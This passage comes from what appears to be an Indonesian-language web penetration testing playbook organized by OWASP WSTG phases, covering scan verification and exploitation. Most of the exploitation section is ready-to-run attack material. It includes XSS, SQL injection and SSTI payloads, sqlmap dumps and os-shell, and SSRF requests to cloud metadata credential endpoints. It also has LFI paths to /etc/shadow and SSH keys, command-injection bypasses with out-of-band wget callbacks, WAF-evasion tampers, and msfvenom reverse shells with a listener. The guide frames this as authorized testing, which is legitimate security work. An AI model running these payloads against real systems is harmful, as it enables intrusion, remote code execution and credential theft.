echo "" >> entry_points.txt
echo "[6] IDOR potential:" >> entry_points.txt
wc -l gf_idor_potential.txt >> entry_points.txt
echo "" >> entry_points.txt
echo "[7] Open Redirect potential:" >> entry_points.txt
wc -l gf_redirect_potential.txt >> entry_points.txt
cat entry_points.txt
```

---

### 3.9 Dokumentasi Scanning

```
📋 Scanning & Enumeration Report:
- Fase            : 3 — Scanning & Enumeration
- WSTG Categories : WSTG-CONF, WSTG-IDNT, WSTG-ATHN, WSTG-SESS, WSTG-INPV
- Live Hosts      : [jumlah]
- Directories     : [jumlah ditemukan dari ffuf/dirsearch/gobuster]
- Parameters      : [jumlah unique params dari paramspider/arjun]
- Vuln Found      : [Critical: X, High: X, Medium: X, Low: X]
- TLS/SSL Status  : [versi, cipher strength]
- Security Headers: [missing headers]
- Technologies    : [framework, CMS, server, language]
- Authentication  : [mekanisme, kelemahan]
- Session Mgmt    : [cookie flags, token entropy]
- Entry Points    : [parameter, header, cookie yang injectable]
- Next Step       : Triple Verification → Lanjut ke Fase 4 — Exploitation
```

### 3.10 Triple Verification — Fase 3 (Scanning & Enumeration)

Ini fase PALING rawan false positive karena menggunakan automated tools. WAJIB verify sebelum exploit:

```bash
# ============================================================
# V1: CROSS-TOOL CONFIRMATION — apakah 2+ tool menemukan hal sama?
# ============================================================
# Jangan percaya SATU tool saja. Cross-check dengan tool berbeda.

# Contoh: nuclei menemukan XSS → cek juga dengan dalfox
# nuclei result: [critical] [xss] https://<TARGET>/search?q=test
# Verify dengan dalfox:
dalfox url "https://<TARGET>/search?q=test" -o verify_nuclei_xss.txt

# Contoh: nikto menemukan directory → cek juga dengan ffuf
# nikto result: + /admin/ - Admin directory found
curl -s -o /dev/null -w "%{http_code}" "https://<TARGET>/admin/"
# HARUS bukan 404

# Contoh: nmap menemukan vuln → cek juga dengan nuclei
# nmap result: SQL Injection in /page?id=
nuclei -u "https://<TARGET>/page?id=1" -tags sqli -o verify_nuclei_sqli.txt

# RULE: Jika hanya SATU tool yang flag → SUSPECT, perlu manual verify
# Jika 2+ tool flag sama → strong signal

# ============================================================
# V2: MANUAL SPOT-CHECK — cek 3-5 temuan secara manual
# ============================================================
# JANGAN langsung exploit semua temuan. Pilih 3-5 yang paling kritis,
# verify manual dulu.

# Contoh spot-check untuk reflected parameter:
# gf xss menemukan: https://<TARGET>/search?q=test&lang=en
# Manual verify:
curl -s "https://<TARGET>/search?q=TESTMARKER123&lang=en" | grep "TESTMARKER123"
# Jika reflected → cek context (di dalam tag? attribute? text node?)
curl -s "https://<TARGET>/search?q=%3Cscript%3ETESTMARKER123%3C/script%3E&lang=en" | grep -o "<script>.*</script>"
# Jika <script> jadi text literal (ter-encode) → bukan XSS

# Contoh spot-check untuk directory discovery:
# ffuf menemukan: /admin (200, size 1234)
# Manual verify:
curl -s "https://<TARGET>/admin" | head -20
# Pastikan ini halaman admin sungguhan, bukan redirect ke login / 404 soft

# ============================================================
# V3: BUKAN ARTIFACT — pastikan temuan bukan noise tools
# ============================================================
# Filter false positive dari automated scanning

# Nuclei: cek apakah template match itu informational atau real vuln
# nuclei -severity critical,high sudah filter, tapi tetap cek:
nuclei -u "https://<TARGET>" -severity critical,high -json | jq '.["matched-at"]' | head -10

# Nikto: sering false positive untuk "OSVDB-xxxx" entries
# Cek manual apakah OSVDB entry benar-benar applicable

# ffuf: filter response size yang misleading
# Temukan "default" response size dulu:
ffuf -u "https://<TARGET>/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -fs 0 -o ffuf_default_size.json -of json
# Kemudian exclude size tersebut dari results

# ============================================================
# VERIFICATION CHECKLIST — Fase 3
# ============================================================
# - V1: [ ] Cross-tool: minimal 2 tools flag temuan yang sama
# - V2: [ ] Manual spot-check: 3-5 temuan kritis di-verify manual
# - V3: [ ] Bukan artifact: nuclei/nikto/ffuf noise sudah di-filter
# - HASIL: 3/3 ✅ = CONFIRMED → lanjut Fase 4 (exploit)
#           2/3 ⚠️ = SUSPECT → exploit HANYA yang sudah verified manual
#           ≤1 ❌ = RE-RUN scan dengan parameter lebih ketat
```

---

## Fase 4 — Exploitation (WSTG Validation)

**Tujuan**: Memverifikasi vulnerability dengan crafting payload dan membuat PoC.
**Tools utama**: sqlmap, dalfox, xsstrike, ffuf, hashcat, flask-unsign, nuclei, kxss, qsreplace, msfconsole

**Referensi lengkap**:
- Baca `references/exploitation_payloads.md` — database payload per vuln type
- Baca `references/waf_bypass_techniques.md` — teknik bypass WAF

> ⚠️ **ANTI FALSE POSITIVE RULE (BERLAKU DI SEMUA FASE):**
> Setiap fase WAJIB melalui Triple Verification sebelum lanjut ke fase berikutnya.
> Detail protokol universal: lihat Section 0 — Universal Verification Protocol.
> Detail per fase: 1.4 (Planning), 2.5 (Recon), 3.10 (Scanning), 4.13 (Exploitation), 5.6 (Reporting).
> **JANGAN PERNAH report temuan yang baru sekali reproduce.**
> Alur wajib: Find → Verify 3x → Baru Report

---

### 4.1 XSS — Cross-Site Scripting (WSTG-INPV-01)

#### 4.1.1 Reflected XSS — dalfox (PRIMARY SCANNER)

```bash
# dalfox — parameter analysis & XSS scanner (GUNAKAN INI UTAMA)
dalfox url "https://<TARGET>/search?q=test" -o dalfox_xss.txt

# dalfox dari file URL list
dalfox file param_urls.txt -o dalfox_batch.txt

# dalfox dengan custom payloads
dalfox url "https://<TARGET>/search?q=test" \
  --custom-payload /usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-RSNAKE.txt \
  -o dalfox_custom.txt

# dalfox dengan WAF bypass mode
dalfox url "https://<TARGET>/search?q=test" \
  --waf-evasion -o dalfox_waf.txt

# dalfox — blind XSS callback (gunakan XSSHunter/Burp Collaborator)
dalfox url "https://<TARGET>/search?q=test" \
  --blind https://YOUR_COLLABORATOR.xss.ht -o dalfox_blind.txt

# dalfox pipe mode (dari URL list)
cat gf_xss_potential.txt | dalfox pipe -o dalfox_pipe.txt
```

#### 4.1.2 Reflected XSS — kxss + qsreplace (PIPELINE)

```bash
# kxss — find parameters reflected in response
# Pipeline: qsreplace ganti value parameter → kxss cek reflection
cat param_urls.txt | qsreplace '<script>alert(1)</script>' | kxss > kxss_reflected.txt

# Cek reflection dengan berbagai karakter
cat param_urls.txt | qsreplace '"><img src=x onerror=alert(1)>' | kxss > kxss_img.txt

# Cek attribute context reflection
cat param_urls.txt | qsreplace "'-alert(1)-'" | kxss > kxss_attr.txt

# Workflow lengkap: find reflected → test XSS
cat param_urls.txt | qsreplace 'FUZZ' | \
  grep -i "FUZZ" | \
  dalfox pipe -o dalfox_from_reflected.txt
```

#### 4.1.3 Reflected XSS — xsschecker

```bash
# xsschecker — scanner tool for finding XSS
xsschecker -u "https://<TARGET>/search?q=test" -o xsschecker_results.txt

# xsschecker dari URL list
xsschecker -l param_urls.txt -o xsschecker_batch.txt
```

#### 4.1.4 XSS — ffuf Fuzzing

```bash
# Fuzzing XSS dengan ffuf
ffuf -u "https://<TARGET>/search?q=FUZZ" \
  -w /usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-RSNAKE.txt \
  -mr "<script|onerror|onload|alert" -o ffuf_xss.json -of json

# XSS polyglot test
ffuf -u "https://<TARGET>/search?q=FUZZ" \
  -w /usr/share/seclists/Fuzzing/XSS/jhaddix-all.txt \
  -mr "<script|onerror|onload|alert|prompt|confirm" \
  -o ffuf_xss_polyglot.json -of json
```

#### 4.1.5 XSS Payloads — Quick Reference

```html
<!-- Basic -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>

<!-- Attribute context -->
" onfocus=alert(document.domain) autofocus="
' onfocus=alert(document.domain) autofocus='
"><script>alert(document.domain)</script>

<!-- Event handlers -->
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<input onfocus=alert(document.domain) autofocus>
<video src=x onerror=alert(document.domain)>

<!-- JavaScript context -->
'-alert(document.domain)-'
"-alert(document.domain)-"
</script><script>alert(document.domain)</script>

<!-- DOM-based -->
javascript:alert(document.domain)
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>

<!-- WAF bypass -->
<svg/onload=alert(document.domain)>
<svg onload=alert(document.domain)//
<img src=x onerror=alert`document.domain`>
<details open ontoggle=alert(document.domain)>
```

---

### 4.2 SQL Injection (WSTG-INPV-05)

#### 4.2.1 sqlmap — Automated SQLi (PRIMARY)

```bash
# Basic scan — GET parameter
sqlmap -u "https://<TARGET>/page?id=1" --batch --level=3 --risk=2 -o sqli_basic.txt

# POST body injection
sqlmap -u "https://<TARGET>/login" --data="username=test&password=test" \
  --batch --level=3 --risk=2 -o sqli_post.txt

# Cookie injection
sqlmap -u "https://<TARGET>/page" --cookie="session=test*; id=1" \
  --batch --level=3 --risk=2 -o sqli_cookie.txt

# Header injection
sqlmap -u "https://<TARGET>/page" --headers="X-Forwarded-For: *" \
  --batch --level=3 --risk=2 -o sqli_header.txt

# Dari Burp request file (export request ke file)
sqlmap -r request.txt --batch --level=5 --risk=3 -o sqli_burp.txt

# Full deep scan
sqlmap -u "https://<TARGET>/page?id=1" \
  --batch --level=5 --risk=3 --tamper=space2comment,randomcase \
  --random-agent --threads=10 -o sqli_deep.txt

# Database enumeration (setelah confirm injection)
sqlmap -u "https://<TARGET>/page?id=1" --batch --dbs
sqlmap -u "https://<TARGET>/page?id=1" --batch -D <DB_NAME> --tables
sqlmap -u "https://<TARGET>/page?id=1" --batch -D <DB_NAME> -T <TABLE> --dump

# Cek privilege escalation
sqlmap -u "https://<TARGET>/page?id=1" --batch --is-dba
sqlmap -u "https://<TARGET>/page?id=1" --batch --os-shell  # HANYA jika diizinkan RoE

# Second-order injection
sqlmap -u "https://<TARGET>/page?id=1" --batch --second-url="https://<TARGET>/profile"
```

#### 4.2.2 sqlmap + WAF Bypass

```bash
# Kombinasi tamper scripts terbaik
sqlmap -u "URL" --tamper=space2comment,charencode,randomcase,between \
  --random-agent --batch

# Tamper scripts reference:
# space2comment    — spasi → /**/
# charencode       — URL encode karakter
# chardoubleencode — double URL encode
# randomcase       — random uppercase/lowercase
# between          — > menjadi NOT BETWEEN 0 AND
# base64encode     — encode ke Base64
# equaltolike      — = menjadi LIKE
# percentage       — tambah % di depan karakter
# greatest         — > menjadi GREATEST
# ifnull2ifisnull  — IFNULL → IF(ISNULL
# modsecurityversioned — tambah /*!00000*/ comment
# space2plus       — spasi → +
# unionalltounion  — UNION ALL → UNION

# Tamper chains untuk WAF berat
sqlmap -u "URL" \
  --tamper=modsecurityversioned,space2comment,randomcase,charencode \
  --random-agent --threads=5 --batch

# Tamper untuk MySQL-specific
sqlmap -u "URL" \
  --tamper=between,greatest,space2comment,randomcase \
  --dbms=mysql --random-agent --batch

# Tamper untuk MSSQL-specific
sqlmap -u "URL" \
  --tamper=space2comment,randomcase,between,charencode \
  --dbms=mssql --random-agent --batch
```

#### 4.2.3 SQLi — Manual Testing Quick Reference

```sql
-- Error-based detection
'
"
' ORDER BY 1--
' UNION SELECT NULL--

-- UNION injection — find column count
' ORDER BY 1--    ← naikkan sampai error
' ORDER BY 10--   ← error = 9 kolom

-- UNION extraction
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT 1,2,3,4,5,6,7,8,9--  ← cek mana yang reflected
' UNION SELECT 1,@@version,3,4,5,6,7,8,9--
' UNION SELECT 1,user(),3,4,5,6,7,8,9--
' UNION SELECT 1,database(),3,4,5,6,7,8,9--

-- Boolean blind
' AND 1=1--  ← harusnya response normal
' AND 1=2--  ← harusnya response beda

-- Time blind
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--
```

---

### 4.3 SSRF — Server-Side Request Forgery (WSTG-INPV-19)

#### 4.3.1 ffuf — SSRF Parameter Discovery

```bash
# Find parameters vulnerable to SSRF
ffuf -u "https://<TARGET>/page?FUZZ=http://127.0.0.1" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mr "root|localhost|127.0.0.1|internal" \
  -o ffuf_ssrf.json -of json

# Test URL parameters for SSRF
cat param_urls.txt | grep -iE "url|uri|link|src|dest|redirect|path|page|feed|host|file|img|image|load|href" > ssrf_potential.txt
```

#### 4.3.2 SSRF Payloads — Internal Access

```bash
# Basic internal
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]

# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean metadata
http://169.254.169.254/metadata/v1/

# Kubernetes
https://kubernetes.default.svc
https://kubernetes.default.svc/api/v1/namespaces

# SSRF bypass — IP encoding
http://2130706433        # decimal 127.0.0.1
http://0x7f000001       # hex 127.0.0.1
http://0177.0.0.1       # octal 127.0.0.1
http://0x7f.0x0.0x0.0x1 # mixed hex
http://127.1             # shorthand
http://0                # 0.0.0.0

# SSRF bypass — URL tricks
http://127.0.0.1@evil.com
http://evil.com#@127.0.0.1
http://127.0.0.1%23@evil.com
http://127.0.0.1:80%25@evil.com

# SSRF bypass — DNS rebinding
# Gunakan service seperti rbndr.us atau ssrf.xip.io

# SSRF — Protocol smuggling
gopher://127.0.0.1:25/_HELO%20localhost
file:///etc/passwd
dict://127.0.0.1:6379/INFO
```

#### 4.3.3 SSRF via nuclei

```bash
# nuclei templates untuk SSRF
nuclei -l live_hosts.txt -tags ssrf -o nuclei_ssrf.txt

# Specific cloud metadata templates
nuclei -l live_hosts.txt -t ~/nuclei-templates/http/vulnerabilities/ -tags ssrf,aws,gcp,azure -o nuclei_cloud_ssrf.txt
```

---

### 4.4 LFI / Path Traversal (WSTG-INPV-12)

#### 4.4.1 ffuf — LFI Detection

```bash
# LFI parameter discovery
ffuf -u "https://<TARGET>/page?FUZZ=../../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mr "root:" -o ffuf_lfi_params.json -of json

# LFI payload fuzzing
ffuf -u "https://<TARGET>/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mr "root:|\\[boot loader\\]|\\[operating systems\\]" \
  -o ffuf_lfi.json -of json

# LFI dengan extension bruteforce
ffuf -u "https://<TARGET>/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -e .php,.asp,.aspx,.jsp,.html,.txt \
  -mr "root:" -o ffuf_lfi_ext.json -of json
```

#### 4.4.2 LFI Payloads — Quick Reference

```bash
# Linux
../../../../../../etc/passwd
../../../../../../etc/shadow
../../../../../../etc/hosts
../../../../../../proc/self/environ
../../../../../../proc/self/cmdline
../../../../../../var/log/apache2/access.log
../../../../../../var/log/nginx/access.log
../../../../../../home/<USER>/.ssh/id_rsa
../../../../../../home/<USER>/.bash_history

# Windows
..\..\..\..\..\..\windows\win.ini
..\..\..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\..\..\boot.ini
..\..\..\..\..\..\inetpub\wwwroot\web.config

# Path traversal bypass
....//....//....//etc/passwd        # double encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL encoding
..%252f..%252f..%252fetc/passwd    # double URL encoding
....\/....\/....\/etc/passwd        # mixed separators
/etc/passwd%00                      # null byte (PHP < 5.3.4)
../../../../etc/passwd%00.html      # null byte + extension

# PHP wrappers
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=config.php
php://input                    # POST body execution
data://text/plain,<?php echo shell_exec('id'); ?>
expect://id                    # command execution

# Log poisoning (LFI + log injection)
# 1. Inject payload ke User-Agent: <?php system($_GET['cmd']); ?>
# 2. LFI ke log file: ../../../../var/log/apache2/access.log&cmd=id
```

---

### 4.5 Command Injection (WSTG-INPV-12)

#### 4.5.1 ffuf — Command Injection Detection

```bash
# Time-based detection (perhatikan response time)
ffuf -u "https://<TARGET>/page?cmd=FUZZ" \
  -w /usr/share/seclists/Fuzzing/command-injection-commix.txt \
  -mr "root:|uid=" -o ffuf_cmdi.json -of json

# Time-based — perhatikan response delay
curl "https://<TARGET>/page?cmd=test%0a%0d sleep 5" -w "\n%{time_total}\n"
```

#### 4.5.2 Command Injection Payloads

```bash
# Basic command injection
; id
| id
|| id
& id
&& id
`id`
$(id)
; cat /etc/passwd
| cat /etc/passwd

# Bypass filters
c'a't /etc/passwd           # quote insertion
c"a"t /etc/passwd           # double quote
cat /etc/pas??d             # wildcard
cat /etc/pass*              # wildcard
/bin/ca? /etc/passwd        # path wildcard
${PATH:0:1}bin${PATH:0:1}cat /etc/passwd  # env var bypass

# Time-based blind
; sleep 5
| sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Out-of-band (OOB)
; nslookup YOUR_DOMAIN
| curl http://YOUR_COLLABORATOR
&& wget http://YOUR_COLLABORATOR/$(whoami)

# Windows
; dir
| dir
& type C:\windows\win.ini
&& whoami
| ping -n 5 127.0.0.1
```

---

### 4.6 SSTI — Server-Side Template Injection (WSTG-INPV-18)

#### 4.6.1 ffuf — SSTI Detection

```bash
# SSTI detection — mathematical operations
# Cek apakah {{7*7}} menghasilkan 49 di response
ffuf -u "https://<TARGET>/page?name=FUZZ" \
  -w /usr/share/seclists/Fuzzing/ssti.txt \
  -mr "49|49.0" -o ffuf_ssti.json -of json
```

#### 4.6.2 SSTI Payloads per Engine

```bash
# Detection
{{7*7}}                    # Jinja2, Twig
${7*7}                     # Freemarker, Mako
<%= 7*7 %>                 # ERB (Ruby)
#{7*7}                     # Slim
{{=7*7}}                   # Pebble
{{7*'7'}}                  # Jinja2 → 777, Twig → 49

# Jinja2 (Python/Flask)
{{config.items()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP/Symfony)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}

# Mako (Python)
<%
import os
x=os.popen('id').read()
%>
${x}

# ERB (Ruby)
<%= `id` %>
<%= system("id") %>
<%= IO.popen("id").readlines() %>
```

---

### 4.7 IDOR / BOLA (WSTG-AUTH-04)

#### 4.7.1 ffuf — IDOR Enumeration

```bash
# Sequential ID enumeration
ffuf -u "https://<TARGET>/api/users/FUZZ/profile" \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer *** \
  -mc 200 -fs <FILTER_SIZE> -o ffuf_idor.json -of json

# UUID enumeration (jika menggunakan UUID)
ffuf -u "https://<TARGET>/api/users/FUZZ" \
  -w <(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 32 | head -1000) \
  -H "Authorization: Bearer *** \
  -mc 200 -o ffuf_idor_uuid.json -of json

# Test horizontal privilege escalation
# 1. Login sebagai user A, catat token
# 2. Request resource milik user B menggunakan token user A
curl -H "Authorization: Bearer *** https://<TARGET>/api/users/<USER_B_ID>/profile

# Test parameter manipulation
# Ganti ID di berbagai parameter: id, user_id, uid, account_id, profile_id
curl -H "Authorization: Bearer *** "https://<TARGET>/api/profile?user_id=<OTHER_USER_ID>"
```

---

### 4.8 Open Redirect (WSTG-INPV-04)

#### 4.8.1 Testing Open Redirect

```bash
# Parameter discovery untuk redirect
ffuf -u "https://<TARGET>/FUZZ?url=https://evil.com" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mr "evil.com" -o ffuf_redirect.json -of json

# Common redirect parameters
for param in url redirect next return_to return_url callback continue dest destination go \
  out redirect_uri redirect_url redir_url rurl target to uri view url_success; do
  resp=$(curl -sI "https://<TARGET>/page?${param}=https://evil.com" | head -1)
  if echo "$resp" | grep -q "30[0-9]"; then
    loc=$(curl -sI "https://<TARGET>/page?${param}=https://evil.com" | grep -i location)
    echo "[OPEN REDIRECT] ?${param}= → $loc"
  fi
done

# Open redirect bypass
https://evil.com
//evil.com
///evil.com
////evil.com
https://target.com@evil.com
https://evil.com%23@target.com
https://evil.com%00.target.com
https://target.com.evil.com
https://target.com\.evil.com
```

---

### 4.9 WAF Bypass Techniques

Ketika WAF memblokir payload, gunakan teknik bypass berikut. **Referensi detail**: `references/waf_bypass_techniques.md`

#### 4.9.1 Payload Generator Script

Script ini memiliki **900+ built-in payloads** + **30,000+ payloads dari SecLists** yang bisa di-load secara dinamis.

```bash
# === XSS (180 built-in + 30,974 SecLists) ===
python scripts/payload_generator.py --type xss --context html --waf-bypass
python scripts/payload_generator.py --type xss --context attribute --waf-bypass
python scripts/payload_generator.py --type xss --context javascript
python scripts/payload_generator.py --type xss --context url
python scripts/payload_generator.py --type xss --context dom
python scripts/payload_generator.py --type xss --context waf_bypass
python scripts/payload_generator.py --type xss --load-seclists    # Load SEMUA dari SecLists

# === SQLi (324 built-in + 1,427 SecLists) ===
python scripts/payload_generator.py --type sqli --context generic --waf-bypass
python scripts/payload_generator.py --type sqli --context union --waf-bypass
python scripts/payload_generator.py --type sqli --context error_based
python scripts/payload_generator.py --type sqli --context time_blind
python scripts/payload_generator.py --type sqli --context boolean_blind
python scripts/payload_generator.py --type sqli --context waf_bypass
python scripts/payload_generator.py --type sqli --context stacked
python scripts/payload_generator.py --type sqli --context nosql
python scripts/payload_generator.py --type sqli --load-seclists    # + auth_bypass, oracle, mssql, mysql, polyglot

# === SSRF (125 built-in) — internal, cloud metadata, protocols, bypass ===
python scripts/payload_generator.py --type ssrf --context internal
python scripts/payload_generator.py --type ssrf --context cloud_metadata    # AWS/GCP/Azure/DO/Alibaba/Oracle/K8s
python scripts/payload_generator.py --type ssrf --context protocols         # file://, gopher://, dict://, etc.
python scripts/payload_generator.py --type ssrf --context bypass

# === XXE (36 built-in + 116 SecLists) ===
python scripts/payload_generator.py --type xxe --context file_read
python scripts/payload_generator.py --type xxe --context blind_oob
python scripts/payload_generator.py --type xxe --context ssrf_via_xxe
python scripts/payload_generator.py --type xxe --context svg_xxe
python scripts/payload_generator.py --type xxe --load-seclists

# === LFI (87 built-in + 21,893 SecLists) ===
python scripts/payload_generator.py --type lfi --context linux --waf-bypass
python scripts/payload_generator.py --type lfi --context windows --waf-bypass
python scripts/payload_generator.py --type lfi --load-seclists --output lfi_all.txt

# === Command Injection (83 built-in + 9,303 SecLists) ===
python scripts/payload_generator.py --type cmdi --context unix --waf-bypass
python scripts/payload_generator.py --type cmdi --context windows
python scripts/payload_generator.py --type cmdi --load-seclists

# === SSTI (40 built-in + 89 SecLists) — Jinja2, Twig, Freemarker, Mako, Pebble, etc. ===
python scripts/payload_generator.py --type ssti --context detection

# === SSI (30 built-in + 75 SecLists) ===
python scripts/payload_generator.py --type ssi

# === LDAP Injection (24 built-in + 26 SecLists) ===
python scripts/payload_generator.py --type ldap

# === CRLF Injection (13 built-in) ===
python scripts/payload_generator.py --type crlf

# === Open Redirect (40 built-in) ===
python scripts/payload_generator.py --type open_redirect

# === UTILITY ===
python scripts/payload_generator.py --list-types                   # List semua types + contexts
python scripts/payload_generator.py --type xss --json              # Output JSON format
python scripts/payload_generator.py --type sqli --output sqli.txt  # Save ke file
```

#### 4.9.2 Quick Reference — Teknik Bypass

| Teknik | Contoh | Kapan Digunakan |
|---|---|---|
| **Case Toggling** | `SeLeCt` → `SELECT` | WAF case-sensitive |
| **Comment Injection** | `SEL/**/ECT` | WAF signature-based |
| **URL Encoding** | `%27%20OR%201%3D1` | WAF tidak decode URL |
| **Double URL Encoding** | `%2527` | Server double-decode |
| **Base64** | `eval(atob('YWxlcnQoMSk='))` | WAF tidak decode Base64 |
| **Hex Encoding** | `0x61646D696E` | MySQL hex literal |
| **Unicode** | `\u003cscript\u003e` | WAF tidak parse unicode |
| **HTML Entities** | `&#97;&#108;&#101;&#114;&#116;` | XSS dalam HTML context |
| **Whitespace Sub** | `UNION%09SELECT` | WAF match spasi literal |
| **MySQL Version Comment** | `/*!50000UNION*/` | MySQL-specific bypass |
| **HPP** | `?id=1&id=UNION SELECT` | Parameter parsing differences |
| **Header Spoofing** | `X-Forwarded-For: 127.0.0.1` | WAF IP-based |

#### 4.9.3 SQLMap Tamper Scripts untuk WAF Bypass

```bash
# Kombinasi tamper scripts yang efektif
sqlmap -u "URL" --tamper=space2comment,charencode,randomcase,between --random-agent --batch

# Tamper scripts tersedia:
# space2comment    — spasi → /**/
# charencode       — URL encode karakter
# chardoubleencode — double URL encode
# randomcase       — random uppercase/lowercase
# between          — > menjadi NOT BETWEEN 0 AND
# base64encode     — encode ke Base64
# equaltolike      — = menjadi LIKE
# percentage       — tambah % di depan karakter
# greatest         — > menjadi GREATEST
# ifnull2ifisnull  — IFNULL → IF(ISNULL
# modsecurityversioned — tambah /*!00000*/ comment
# space2plus       — spasi → +
# unionalltounion  — UNION ALL → UNION
```

---

### 4.10 Metasploit Framework (msfconsole / msfvenom)

#### 4.10.1 Web Application Exploitation

```bash
# Search exploits untuk target technology
msfconsole -q -x "search type:exploit platform:linux; exit"

# Exploit HTTP modules
msfconsole -q -x "use exploit/multi/http/<MODULE>; show options; exit"

# Generate payloads dengan msfvenom
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f raw > shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f raw > shell.jsp

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f asp > shell.asp

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f raw > shell.py

# Listener setup
msfconsole -q -x "
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
exploit
"
```

---

### 4.11 Prinsip Exploitation

1. **Minimal Impact** — Buat PoC yang membuktikan vulnerability tanpa menyebabkan kerusakan
2. **No Data Exfiltration** — Jangan mengambil data user sebenarnya; gunakan `alert(document.domain)` untuk XSS, `version()` untuk SQLi
3. **Document Everything** — Catat setiap langkah, payload, dan response
4. **One Vulnerability at a Time** — Fokus per vulnerability, jangan chain tanpa izin eksplisit
5. **Stop at PoC** — Buktikan vulnerability ada, jangan lanjutkan ke post-exploitation kecuali diminta

---

### 4.12 Dokumentasi Exploitation

```
📋 Vulnerability Found:
- Fase            : 4 — Exploitation
- Type            : [XSS/SQLi/SSRF/XXE/LFI/IDOR/CMDi/SSTI/etc.]
- WSTG ID         : [WSTG-INPV-XX]
- Endpoint        : [URL/parameter]
- Payload         : [payload yang berhasil]
- WAF Bypass?     : [ya/tidak — teknik apa]
- Tool Used       : [dalfox/sqlmap/ffuf/nuclei/manual]
- Impact          : [apa yang bisa dicapai]
- Severity        : [Critical/High/Medium/Low]
- CVSS Score      : [X.X]
- Evidence        : [screenshot/response]
- Remediation     : [rekomendasi perbaikan]
- Next Step       : VERIFIKASI 3x sebelum masuk Fase 5 — Reporting
```

---

## ⚠️ TRIPLE VERIFICATION PROTOCOL (WAJIB — Anti False Positive)

> **RULE MUTLAK**: Setiap vulnerability yang ditemukan WAJIB diverifikasi minimal 3x dengan pendekatan berbeda sebelum bisa dilaporkan. Jika salah satu verifikasi GAGAL, temuan diturunkan severity-nya atau dianggap FALSE POSITIVE.

### Protokol Umum

```
┌──────────────────────────────────────────────────────┐
│  VULNERABILITY DITEMUKAN (Fase 4)                    │
└──────────────────────┬───────────────────────────────┘
                       ↓
┌──────────────────────────────────────────────────────┐
│  VERIFICATION 1 — Re-produce dengan payload SAMA     │
│  Apakah bisa di-reproduce secara konsisten?           │
│  ✅ = lanjut  ❌ = FALSE POSITIVE, stop               │
└──────────────────────┬───────────────────────────────┘
                       ↓
┌──────────────────────────────────────────────────────┐
│  VERIFICATION 2 — Variasi payload / teknik BERBEDA   │
│  Gunakan payload alternatif atau metode berbeda       │
│  ✅ = lanjut  ❌ = turunkan severity / suspect FP     │
└──────────────────────┬───────────────────────────────┘
                       ↓
┌──────────────────────────────────────────────────────┐
│  VERIFICATION 3 — Clean context / fresh session      │
│  Bersihkan cookies/cache, gunakan incognito/fresh     │
│  ✅ = CONFIRMED  ❌ = suspect FP, butuh manual check  │
└──────────────────────┬───────────────────────────────┘
                       ↓
┌──────────────────────────────────────────────────────┐
│  HASIL: CONFIRMED ✅ → masuk Fase 5 Reporting        │
│         SUSPECT    ⚠️ → flag sebagai "Needs Manual"  │
│         FALSE POS  ❌ → discard, catat alasan         │
└──────────────────────────────────────────────────────┘
```

---

### 4.13.1 Triple Verification — XSS (WSTG-INPV-01)

```bash
# ============================================================
# VERIFICATION 1 — Reproduce dengan payload SAMA
# ============================================================
# Jalankan ulang exact payload yang berhasil pertama kali
# HARUS menghasilkan alert/reflection yang sama
curl -s "https://<TARGET>/search?q=<PAYLOAD_YANG_SAMA>" | grep -i "<PAYLOAD>"

# ============================================================
# VERIFICATION 2 — Variasi payload BERBEDA (bukan hanya satu payload)
# ============================================================
# Ganti payload dengan versi berbeda — tetap harus bisa execute

# Jika payload awal: <script>alert(1)</script>
# Cek juga:
curl -s "https://<TARGET>/search?q=<img+src=x+onerror=alert(1)>" | grep -i "onerror"
curl -s "https://<TARGET>/search?q=<svg+onload=alert(1)>" | grep -i "onload"
curl -s "https://<TARGET>/search?q=%22%3E%3Cscript%3Ealert(1)%3C/script%3E" | grep -i "script"

# Jika hanya SATU payload yang work → SUSPECT, flag sebagai "limited exploitation"
